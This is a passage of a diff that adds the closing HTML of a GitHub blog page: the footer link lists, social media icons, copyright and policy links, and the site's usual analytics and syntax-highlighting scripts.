2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"></path>
+				</svg>
+			</a>
+		</div>
+
+		<div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 pr-3 pr-lg-0 pl-lg-4"><h2 class="h5 mb-3 text-mono color-text-tertiary text-normal">Product</h2><ul class="list-style-none text-gray f5"><li class="lh-condensed mb-3"><a href="https://github.com/features" data-ga-click="Site Foundation Components, go to Features, site foundation components footer" class="Link--secondary">Features</a></li><li class="lh-condensed mb-3"><a href="https://github.com/security" data-ga-click="Site Foundation Components, go to Security, site foundation components footer" class="Link--secondary">Security</a></li><li class="lh-condensed mb-3"><a href="https://github.com/enterprise" data-ga-click="Site Foundation Components, go to Enterprise, site foundation components footer" class="Link--secondary">Enterprise</a></li><li class="lh-condensed mb-3"><a href="https://github.com/customer-stories?type=enterprise" data-ga-click="Site Foundation Components, go to Customer Stories, site foundation components footer" class="Link--secondary">Customer Stories</a></li><li class="lh-condensed mb-3"><a href="https://github.com/pricing" data-ga-click="Site Foundation Components, go to Pricing, site foundation components footer" class="Link--secondary">Pricing</a></li><li class="lh-condensed mb-3"><a href="https://resources.github.com/" data-ga-click="Site Foundation Components, go to Resources, site foundation components footer" class="Link--secondary">Resources</a></li></ul></div><div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 pr-3 pr-lg-0 pl-lg-4"><h2 class="h5 mb-3 text-mono color-text-tertiary text-normal">Platform</h2><ul class="list-style-none text-gray f5"><li class="lh-condensed mb-3"><a href="https://developer.github.com/" data-ga-click="Site Foundation Components, go to Developer API, site foundation components footer" class="Link--secondary">Developer API</a></li><li class="lh-condensed mb-3"><a href="https://partner.github.com/" data-ga-click="Site Foundation Components, go to Partners, site foundation components footer" class="Link--secondary">Partners</a></li><li class="lh-condensed mb-3"><a href="https://atom.io/" data-ga-click="Site Foundation Components, go to Atom, site foundation components footer" class="Link--secondary">Atom</a></li><li class="lh-condensed mb-3"><a href="https://www.electronjs.org/" data-ga-click="Site Foundation Components, go to Electron, site foundation components footer" class="Link--secondary">Electron</a></li><li class="lh-condensed mb-3"><a href="https://desktop.github.com/" data-ga-click="Site Foundation Components, go to GitHub Desktop, site foundation components footer" class="Link--secondary">GitHub Desktop</a></li></ul></div><div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 pr-3 pr-lg-0 pl-lg-4"><h2 class="h5 mb-3 text-mono color-text-tertiary text-normal">Support</h2><ul class="list-style-none text-gray f5"><li class="lh-condensed mb-3"><a href="https://docs.github.com/" data-ga-click="Site Foundation Components, go to Docs, site foundation components footer" class="Link--secondary">Docs</a></li><li class="lh-condensed mb-3"><a href="https://github.community/" data-ga-click="Site Foundation Components, go to Community Forum, site foundation components footer" class="Link--secondary">Community Forum</a></li><li class="lh-condensed mb-3"><a href="https://services.github.com/" data-ga-click="Site Foundation Components, go to Training, site foundation components footer" class="Link--secondary">Training</a></li><li class="lh-condensed mb-3"><a href="https://www.githubstatus.com/" data-ga-click="Site Foundation Components, go to Status, site foundation components footer" class="Link--secondary">Status</a></li><li class="lh-condensed mb-3"><a href="https://support.github.com/" data-ga-click="Site Foundation Components, go to Contact, site foundation components footer" class="Link--secondary">Contact</a></li></ul></div><div class="col-6 col-sm-3 col-lg-2 mb-6 mb-md-2 pr-3 pr-lg-0 pl-lg-4"><h2 class="h5 mb-3 text-mono color-text-tertiary text-normal">Company</h2><ul class="list-style-none text-gray f5"><li class="lh-condensed mb-3"><a href="https://github.com/about" data-ga-click="Site Foundation Components, go to About, site foundation components footer" class="Link--secondary">About</a></li><li class="lh-condensed mb-3"><a href="https://github.blog/" data-ga-click="Site Foundation Components, go to Blog, site foundation components footer" class="Link--secondary">Blog</a></li><li class="lh-condensed mb-3"><a href="https://github.com/about/careers" data-ga-click="Site Foundation Components, go to Careers, site foundation components footer" class="Link--secondary">Careers</a></li><li class="lh-condensed mb-3"><a href="https://github.com/about/press" data-ga-click="Site Foundation Components, go to Press, site foundation components footer" class="Link--secondary">Press</a></li><li class="lh-condensed mb-3"><a href="https://shop.github.com/" data-ga-click="Site Foundation Components, go to Shop, site foundation components footer" class="Link--secondary">Shop</a></li></ul></div>
+	</div>
+</div>
+
+		
+<div class="color-bg-secondary">
+	<div class="container-xl p-responsive f6 py-4 d-sm-flex flex-justify-between flex-row-reverse flex-items-center">
+
+		<ul class="list-style-none d-flex flex-items-center mb-3 mb-sm-0 lh-condensed-ultra">
+			<li class="mr-3">
+				<a href="https://twitter.com/github" data-ga-click="Resources, go to Twitter, resources footer" style="color: #959da5;">
+					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 273.5 222.3" class="d-block" height="18">
+						<path d="M273.5 26.3a109.77 109.77 0 0 1-32.2 8.8 56.07 56.07 0 0 0 24.7-31 113.39 113.39 0 0 1-35.7 13.6 56.1 56.1 0 0 0-97 38.4 54 54 0 0 0 1.5 12.8A159.68 159.68 0 0 1 19.1 10.3a56.12 56.12 0 0 0 17.4 74.9 56.06 56.06 0 0 1-25.4-7v.7a56.11 56.11 0 0 0 45 55 55.65 55.65 0 0 1-14.8 2 62.39 62.39 0 0 1-10.6-1 56.24 56.24 0 0 0 52.4 39 112.87 112.87 0 0 1-69.7 24 119 119 0 0 1-13.4-.8 158.83 158.83 0 0 0 86 25.2c103.2 0 159.6-85.5 159.6-159.6 0-2.4-.1-4.9-.2-7.3a114.25 114.25 0 0 0 28.1-29.1" fill="currentColor"></path>
+					</svg>
+
+					<span class="sr-only">GitHub on Twitter</span>
+				</a>
+			</li>
+			<li class="mr-3">
+				<a href="https://www.facebook.com/GitHub" data-ga-click="Resources, go to Facebook, resources footer" style="color: #959da5;">
+					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.3 15.4" class="d-block" height="18">
+						<path d="M14.5 0H.8a.88.88 0 0 0-.8.9v13.6a.88.88 0 0 0 .8.9h7.3v-6h-2V7.1h2V5.4a2.87 2.87 0 0 1 2.5-3.1h.5a10.87 10.87 0 0 1 1.8.1v2.1h-1.3c-1 0-1.1.5-1.1 1.1v1.5h2.3l-.3 2.3h-2v5.9h3.9a.88.88 0 0 0 .9-.8V.8a.86.86 0 0 0-.8-.8z" fill="currentColor"></path>
+					</svg>
+
+					<span class="sr-only">GitHub on Facebook</span>
+				</a>
+			</li>
+			<li class="mr-3">
+				<a href="https://www.youtube.com/github" data-ga-click="Resources, go to YouTube, resources footer" style="color: #959da5;">
+					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.17 13.6" class="d-block" height="16">
+						<path d="M18.77 2.13A2.4 2.4 0 0 0 17.09.42C15.59 0 9.58 0 9.58 0a57.55 57.55 0 0 0-7.5.4A2.49 2.49 0 0 0 .39 2.13 26.27 26.27 0 0 0 0 6.8a26.15 26.15 0 0 0 .39 4.67 2.43 2.43 0 0 0 1.69 1.71c1.52.42 7.5.42 7.5.42a57.69 57.69 0 0 0 7.51-.4 2.4 2.4 0 0 0 1.68-1.71 25.63 25.63 0 0 0 .4-4.67 24 24 0 0 0-.4-4.69zM7.67 9.71V3.89l5 2.91z" fill="currentColor"></path>
+					</svg>
+
+					<span class="sr-only">GitHub on YouTube</span>
+				</a>
+			</li>
+			<li class="mr-3 flex-self-start">
+				<a href="https://www.linkedin.com/company/github" data-ga-click="Resources, go to Linkedin, resources footer" style="color: #959da5;">
+					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19 18" class="d-block" height="18">
+						<path d="M3.94 2A2 2 0 1 1 2 0a2 2 0 0 1 1.94 2zM4 5.48H0V18h4zm6.32 0H6.34V18h3.94v-6.57c0-3.66 4.77-4 4.77 0V18H19v-7.93c0-6.17-7.06-5.94-8.72-2.91z" fill="currentColor"></path>
+					</svg>
+
+					<span class="sr-only">GitHub on LinkedIn</span>
+				</a>
+			</li>
+			<li>
+				<a href="https://github.com/github" data-ga-click="Resources, go to github's org, resources footer" style="color: #959da5;">
+					<svg height="20" class="octicon octicon-mark-github d-block" alt="" viewBox="0 0 16 16" version="1.1" width="20" aria-hidden="true">
+						<path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+					</svg>
+					<span class="sr-only">GitHub’s organization on GitHub</span>
+				</a>
+			</li>
+		</ul>
+
+		<ul class="list-style-none d-flex flex-wrap text-gray">
+			<li class="mr-3">&copy; 2022 GitHub, Inc.</li>
+
+			<li class="mr-3">
+				<a href="https://docs.github.com/en/github/site-policy/github-terms-of-service" data-ga-click="Site Foundation Components, go to terms, site foundation components footer" class="Link--secondary">Terms</a>
+			</li>
+
+			<li class="mr-3">
+				<a href="https://docs.github.com/en/github/site-policy/github-privacy-statement" data-ga-click="Site Foundation Components, go to privacy, site foundation components footer" class="Link--secondary">Privacy</a>
+			</li>
+
+		</ul>
+
+	</div>
+</div>
+	</footer>
+</div>
+
+<script type="text/javascript" src="https://github.blog/_static/??-eJyNj80KwjAQhF/IdBtLFQ/io0hs1jbtZjfkR+nbG6EHDyKe5jDfNzDwDGoQzsgZfFGByug4wYw5mGFRum1OcHU8wK04shAmycJbNN5xM6cd1I2KULFYzQTWpQwPZCsRIo7IGE2WqGLh7Dz+o9UqCK13R/QTn0SW9El8+fLeMjEhrapr9tsREmMxVuviz/rQ67Y/trqbX1s4YpM=" ></script><script data-parsely-site="github.blog" src='https://cdn.parsely.com/keys/github.blog/p.js?ver=3.2.1' id="parsely-cfg"></script>
+<script type="text/javascript" src="https://github.blog/wp-content/themes/github-2021/assets/js/site.min.js?m=1651170422g" ></script><script src='https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/highlight.min.js?ver=11.4.0' id='highlightjs-js'></script>
+<script type="text/javascript" src="https://github.blog/wp-content/themes/github-2021/assets/js/highlight.init.js?m=1651170422g" ></script><script src='https://github.blog/wp-content/themes/github-2021/assets/js/hydro-analytics-instrumentation.min.js?ver=0.0.1' id='hydro-analytics-js'></script>
+	<script>
+		window._ha.sendPageView();
+
+		document.addEventListener('click', ({ target }) => {
+			if (target && target.matches('a')) {
+				const hasUrl = target?.href !== undefined;
+
+				window._ha.sendEvent('analytics.click', {
+					text: target?.innerText || target?.ariaLabel,
+					...(hasUrl && { target: target.href })
+				});
+			}
+		});
+	</script>
+	<script src='https://stats.wp.com/e-202218.js' defer></script>
+<script>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:10.9',blog:'153214340',post:'58581',tz:'-7',srv:'github.blog',hp:'vip'} ]);
+	_stq.push([ 'clickTrackerInit', '153214340', '58581' ]);
+</script>
+
 </body>
 </html>
